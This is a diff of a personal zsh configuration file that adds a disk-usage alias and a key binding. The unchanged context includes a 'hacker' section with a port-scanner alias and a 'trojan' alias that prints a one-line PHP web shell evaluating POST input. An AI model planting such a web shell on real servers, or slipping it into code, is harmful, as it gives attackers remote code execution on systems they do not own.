@@ -15,6 +15,7 @@ alias ggg="gaa && gcmsg ".." && gp"
 alias gitback="git reset . && git checkout . && git clean -df" # git back (to origin)
 alias cae="conda activate"
 alias cde="conda deactivate"
+alias sizeof="du -sh" 
 # hacker
 alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
 alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
@@ -65,6 +66,8 @@ else
   __conda="$HOME/.miniconda"
 fi
 
+# key bindings
+bindkey \^U backward-kill-line
 
 ZSH_THEME="ys"
 
@@ -108,3 +111,4 @@ if [ -d "$HOME/.nvm" ]; then
   [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
 fi
 # <<< nvm initialize <<<
+
